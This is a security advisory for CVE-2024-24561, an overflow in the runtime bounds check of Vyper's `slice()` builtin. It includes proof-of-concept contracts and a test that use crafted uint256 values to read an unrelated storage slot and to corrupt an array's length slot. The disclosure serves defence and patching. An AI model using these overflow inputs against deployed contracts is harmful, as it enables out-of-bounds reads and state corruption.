# Vyper's bounds check on built-in `slice()` function can be overflowed

**GHSA**: GHSA-9x7f-gwxq-6f2c | **CVE**: CVE-2024-24561 | **Severity**: critical (CVSS 9.8)

**CWE**: CWE-119

**Affected Packages**:
- **vyper** (pip): <= 0.3.10

## Description

## Summary

[The bounds check for slices](https://github.com/vyperlang/vyper/blob/b01cd686aa567b32498fefd76bd96b0597c6f099/vyper/builtins/functions.py#L404-L457) does not account for the ability for `start + length` to overflow when the values aren't literals. 

If a `slice()` function uses a non-literal argument for the `start`  or `length` variable, this creates the ability for an attacker to overflow the bounds check. 

This issue can be used to do OOB access to storage, memory or calldata addresses. It can also be used to corrupt the `length` slot of the respective array.

A contract search was performed and no vulnerable contracts were found in production.

tracking in issue https://github.com/vyperlang/vyper/issues/3756.
patched in https://github.com/vyperlang/vyper/pull/3818.

## Details
Here the flow for `storage` is supposed, but it is generalizable also for the other locations.

When calling `slice()` on a storage value, there are compile time bounds checks if the `start` and `length` values are literals, but of course this cannot happen if they are passed values:

```python
if not is_adhoc_slice:
    if length_literal is not None:
        if length_literal < 1:
            raise ArgumentException("Length cannot be less than 1", length_expr)

        if length_literal > arg_type.length:
            raise ArgumentException(f"slice out of bounds for {arg_type}", length_expr)

    if start_literal is not None:
        if start_literal > arg_type.length:
            raise ArgumentException(f"slice out of bounds for {arg_type}", start_expr)
        if length_literal is not None and start_literal + length_literal > arg_type.length:
            raise ArgumentException(f"slice out of bounds for {arg_type}", node)
```

At runtime, we perform the following equivalent check, but the runtime check does not account for overflows:
```python
["assert", ["le", ["add", start, length], src_len]],  # bounds check
```

The storage `slice()` function copies bytes directly from storage into memory and returns the memory value of the resulting slice. This means that, if a user is able to input the `start`  or `length` value, they can force an overflow and access an unrelated storage slot.

In most cases, this will mean they have the ability to forcibly return `0` for the slice, even if this shouldn't be possible. In extreme cases, it will mean they can return another unrelated value from storage.

## POC: OOB access

For simplicity, take the following Vyper contract, which takes an argument to determine where in a `Bytes[64]` bytestring should be sliced. It should only accept a value of zero, and should revert in all other cases.

```python
# @version ^0.3.9

x: public(Bytes[64])
secret: uint256

@external
def __init__():
    self.x = empty(Bytes[64])
    self.secret = 42

@external
def slice_it(start: uint256) -> Bytes[64]:
    return slice(self.x, start, 64)
```

We can use the following manual storage to demonstrate the vulnerability:
```json
{"x": {"type": "bytes32", "slot": 0}, "secret": {"type": "uint256", "slot": 3618502788666131106986593281521497120414687020801267626233049500247285301248}}
```

If we run the following test, passing `max - 63` as the `start` value, we will overflow the bounds check, but access the storage slot at `1 + (2**256 - 63) / 32`, which is what was set in the above storage layout:
```solidity
function test__slice_error() public {
    c = SuperContract(deployer.deploy_with_custom_storage("src/loose/", "slice_error", "slice_error_storage"));
    bytes memory result = c.slice_it(115792089237316195423570985008687907853269984665640564039457584007913129639872); // max - 63
    console.logBytes(result);
}
```

The result is that we return the secret value from storage:
```
Logs:
0x0000...00002a
```
## POC: `length` corruption
`OOG` exception doesn't have to be raised - because of the overflow, only a few bytes can be copied, but the `length` slot is set with the original input value.

```python
d: public(Bytes[256])
	
@external
def test():
	x : uint256 = 115792089237316195423570985008687907853269984665640564039457584007913129639935 # 2**256-1
	self.d = b"\x01\x02\x03\x04\x05\x06"
	# s : Bytes[256] = slice(self.d, 1, x)
	assert len(slice(self.d, 1, x))==115792089237316195423570985008687907853269984665640564039457584007913129639935
```
The corruption of `length` can be then used to read dirty memory:
```python
@external
def test():
    x: uint256 = 115792089237316195423570985008687907853269984665640564039457584007913129639935  # 2**256 - 1
    y: uint256 = 22704331223003175573249212746801550559464702875615796870481879217237868556850   # 0x3232323232323232323232323232323232323232323232323232323232323232
    z: uint96 = 1
    if True:
        placeholder : uint256[16] = [y, y, y, y, y, y, y, y, y, y, y, y, y, y, y, y]
    s :String[32] = slice(uint2str(z), 1, x)	# uint2str(z) == "1"
    #print(len(s))
    assert slice(s, 1, 2) == "22"
```

## Impact

The built-in `slice()` method can be used for OOB accesses or the corruption of the `length` slot.
